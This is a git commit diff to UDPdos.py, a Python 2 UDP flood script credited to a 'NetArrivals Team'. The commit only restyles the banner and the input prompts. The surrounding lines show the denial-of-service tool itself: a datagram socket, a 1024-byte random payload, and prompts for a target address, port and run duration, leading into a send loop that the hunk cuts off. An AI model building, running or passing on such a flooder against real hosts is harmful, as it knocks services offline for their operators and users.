85e385cd57312b20dc382386aaf105385b470f53
RussianOtter <elangs321@gmail.com>
2016-12-14 23:51:43 -0500

    Update UDPdos.py
    v1.6.2
    apdos 1.6.2 support

--- UDPdos.py
+++ UDPdos.py
@@ -1,18 +1,18 @@
 import socket, sys, os, time, itertools, threading, random
 credits = (
-	'\n-+--=:=-      -=:=--+-\n'
-	'Code: NetArrivals Team\n'
-	' Mod: Savage Official\n'
-	'-+--=:=-      -=:=--+-\n'
+	'\n     -+--=:=-  -++-  -=:=--+-\n'
+	'      Code: NetArrivals Team\n'
+	'       Mod: Savage Official\n'
+	'     -+--=:=-  -++-  -=:=--+-\n'
 	)
 client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
 def pres():
 	print credits
 pres()
-victim  = raw_input('Target: ')
-vport = input('Port: ')
-duration  = input('Run: ')
+victim  = raw_input(' -+- Target: ')
+vport = input(' -+- Port: ')
+duration  = input(' -+- Run: ')
 timeout =  time.time() + duration
 sent = 0
 while 1:
